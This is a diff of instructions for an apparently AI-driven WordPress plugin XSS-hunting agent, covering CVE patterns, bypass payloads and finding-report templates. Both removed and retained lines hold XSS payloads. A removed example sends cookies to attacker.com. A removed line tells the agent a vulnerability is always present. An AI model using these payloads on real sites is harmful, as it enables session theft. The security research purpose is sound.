@@ -195,126 +195,15 @@ $out = "<script type=\"text/javascript\">
 **Why vulnerable:** `shortcode_atts()` values are user-controlled (Contributor+ can create posts with `[photofade time="1});alert(1);//"]`). Direct interpolation into `<script>` block — no `esc_js()`, `absint()`, or `wp_json_encode()`.
 **Detection:** `extract(shortcode_atts(` followed by `$variable` in string interpolation inside `<script>` blocks or HTML attributes.
 
-### CVE-2024-11287: Ebook Store — REQUEST_URI Reflected XSS
-**Impact:** Unauthenticated Reflected XSS, CVSS 6.1
-
-```php
-// Raw $_SERVER['REQUEST_URI'] output in href attribute
-<a id="wpsc-dismiss" href="<?php echo $_SERVER['REQUEST_URI']; ?>&dismiss=wpsc">Dismiss</a>
-
-// Also in wp_die() JavaScript output
-die("<script>window.location = '" . add_query_arg('ebook_key', $key) . "';</script>");
-```
-
-**Why vulnerable:** `$_SERVER['REQUEST_URI']` contains raw request URL including query params. `add_query_arg()` without a base URL argument uses the unescaped current URI. Both output without `esc_url()` or `esc_attr()`.
-**Detection:** `$_SERVER['REQUEST_URI']` or `add_query_arg()` without `esc_url()` wrapper in `echo`, `href=`, or JS context.
-
-### CVE-2024-8967: PWA Plugin — SVG Upload XSS
-**Impact:** Author+ Stored XSS, CVSS 6.4
-
-```php
-// Plugin adds SVG MIME type with NO content sanitization
-public function upload_mimes( $mimes = array() ) {
-    $mimes['svg']  = 'image/svg+xml';
-    $mimes['svgz'] = 'image/svg+xml';
-    return $mimes;
-}
-// upload_check() only validates extension, never inspects SVG content
-```
-
-**Why vulnerable:** SVG files are XML that can contain `<script>` tags, event handlers (`onload`), and other executable content. Adding the MIME type without a sanitization library (like SVG Sanitizer) lets Author+ upload `<svg onload="alert(1)">`.
-**Detection:** `upload_mimes` filter adding `image/svg+xml` without corresponding SVG content sanitization (look for absence of DOMDocument parsing or svg-sanitizer library).
+Also review: **CVE-2024-11287** (Ebook Store — `$_SERVER['REQUEST_URI']` / `add_query_arg()` reflected without `esc_url()`, CVSS 6.1), **CVE-2024-8967** (PWA Plugin — SVG MIME added via `upload_mimes` without content sanitization, Author+ Stored XSS, CVSS 6.4).
 
 ---
 
 ## Attack Techniques
 
-### 1. Basic Payloads
-```html
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-<marquee onstart=alert(1)>
-<video><source onerror=alert(1)>
-<audio src=x onerror=alert(1)>
-<details open ontoggle=alert(1)>
-```
+> Generic XSS payloads (`<script>alert(1)</script>`, encoding tricks, case variations, etc.) are omitted — use standard references for those. Focus on **WordPress-specific** attack surfaces below.
 
-### 2. Attribute Context Escapes
-```html
-" onclick="alert(1)" x="
-' onclick='alert(1)' x='
-" onfocus="alert(1)" autofocus="
-"><script>alert(1)</script><"
-```
-
-### 3. JavaScript Context Escapes
-```javascript
-';alert(1)//
-";alert(1)//
-</script><script>alert(1)</script>
-\';alert(1)//
-```
-
-### 4. URL Context (href/src)
-```
-javascript:alert(1)
-data:text/html,<script>alert(1)</script>
-data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-```
-
-### 5. CSS Context
-```css
-expression(alert(1))
-url(javascript:alert(1))
-</style><script>alert(1)</script>
-```
-
-### 6. SVG XSS
-```xml
-<svg><script>alert(1)</script></svg>
-<svg onload="alert(1)">
-<svg><animate onbegin=alert(1)>
-<svg><set onbegin=alert(1)>
-<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>">
-```
-
-### 7. Filter Bypass Techniques
-```html
-<!-- Case variations -->
-<ScRiPt>alert(1)</sCrIpT>
-<IMG SRC=x OnErRoR=alert(1)>
-
-<!-- Without quotes -->
-<img src=x onerror=alert(1)>
-
-<!-- Without spaces -->
-<img/src=x/onerror=alert(1)>
-
-<!-- HTML entities -->
-<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
-<a href="&#106;avascript:alert(1)">
-
-<!-- Unicode escapes -->
-<script>\u0061lert(1)</script>
-
-<!-- Null bytes -->
-<scr%00ipt>alert(1)</script>
-
-<!-- Newlines/tabs in event handlers -->
-<img src=x onerror="
-alert(1)">
-
-<!-- SVG with encoded payload -->
-<svg><script>&#97;lert(1)</script></svg>
-
-<!-- Template literals (JS) -->
-${alert(1)}
-```
-
-### 8. wp_kses Bypass
+### wp_kses Bypass
 ```html
 <!-- If 'a' tag with href allowed -->
 <a href="javascript:alert(1)">click</a>
@@ -329,11 +218,30 @@ ${alert(1)}
 <div data-action="alert(1)">
 ```
 
-### 9. Mutation XSS
-```html
-<!-- Browser "fixes" these in exploitable ways -->
-<noscript><p title="</noscript><script>alert(1)</script>">
-<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+### Shortcode Attribute XSS
+```php
+// Shortcode attrs interpolated into JS or HTML without escaping
+extract(shortcode_atts(array('param' => ''), $atts));
+echo '<div class="' . $param . '">';           // attr context
+echo '<script>var v = "' . $param . '";</script>'; // JS context
+```
+
+### wp_localize_script Injection
+```php
+// User-controlled data passed to JS via wp_localize_script
+wp_localize_script('handle', 'obj', array(
+    'value' => $user_input  // No esc_js — available as obj.value in JS
+));
+// If JS does: element.innerHTML = obj.value → DOM XSS
+```
+
+### Gutenberg Block XSS
+```php
+// Block render callback outputs attributes without escaping
+function render_block($attributes) {
+    return '<div style="' . $attributes['customCSS'] . '">' .
+           $attributes['content'] . '</div>';  // Both unescaped
+}
 ```
 
 ---
@@ -413,65 +321,29 @@ wpguard_sandbox_request(
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
 ```python
 wpguard_finding_create(
     plugin_slug="example-plugin",
     plugin_version="1.0.0",
     active_installs=50000,
-    vuln_type="stored_xss",  # or reflected_xss
-    title="Stored XSS via User Profile Bio Field",
-    description="""
-## Vulnerability Summary
-Stored XSS in user bio field allows persistent script execution when profile is viewed.
-
+    vuln_type="stored_xss",  # or reflected_xss, dom_xss
+    title="Stored XSS via Shortcode Attribute in JS Context",
+    description="""## Vulnerability Summary
+...
 ## Data Flow
-Entry: Profile update form (subscriber+)
-  ↓
-Input: $_POST['bio']
-  ↓
-Storage: update_user_meta($user_id, 'bio', sanitize_textarea_field($_POST['bio']))
-  ↓
-Note: sanitize_textarea_field does NOT prevent XSS
-  ↓
-Retrieval: $bio = get_user_meta($user_id, 'bio', true)
-  ↓
-Output: echo '<div class="bio">' . $bio . '</div>';  // NO ESCAPING!
-
+Entry → Storage → Output (with context)
 ## Prerequisites
-None — works with default plugin settings.
-
+...
 ## Exploitation
-1. Update bio to: <img src=x onerror="document.location='http://attacker.com/steal?c='+document.cookie">
-2. When admin views user profile, cookies stolen
-3. Session hijacking achieved
-
+...
 ## Impact
-- Session hijacking via cookie theft
-- Admin account takeover
-- Malware distribution to site visitors
-    """,
-    auth_level="subscriber",
+...""",
+    auth_level="contributor",
     cvss_score=6.4,
     cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
-    affected_file="includes/profile.php",
-    affected_function="display_user_profile",
-    affected_line=234
+    affected_file="includes/shortcodes.php",
+    affected_function="render_shortcode",
+    affected_line=42
 )
 ```
 
@@ -505,90 +377,6 @@ Since the attacker needs no privileges to craft the payload, report as `auth_lev
 - Reflected XSS on subscriber dashboard → targets subscribers+
 - Reflected XSS on public page → targets any logged-in user
 
-```python
-wpguard_finding_create(
-    vuln_type="reflected_xss",
-    auth_level="unauthenticated",  # ALWAYS - attacker needs no account
-    description="""
-## Target Role
-This vulnerability targets **Administrator** users. The XSS is in the admin settings page,
-so only administrators would visit this URL.
-
-## Attack Scenario
-1. Attacker crafts: /wp-admin/options.php?page=plugin&search=<script>alert(1)</script>
-2. Attacker sends link to site admin
-3. Admin clicks link while logged in
-4. XSS executes, stealing admin cookies/session
-    """,
-    # ...
-)
-```
-
 ---
 
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., stored payload renders unescaped in response, reflected input appears in HTML without encoding)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=stored payload renders unescaped in response, reflected input appears in HTML without encoding}}
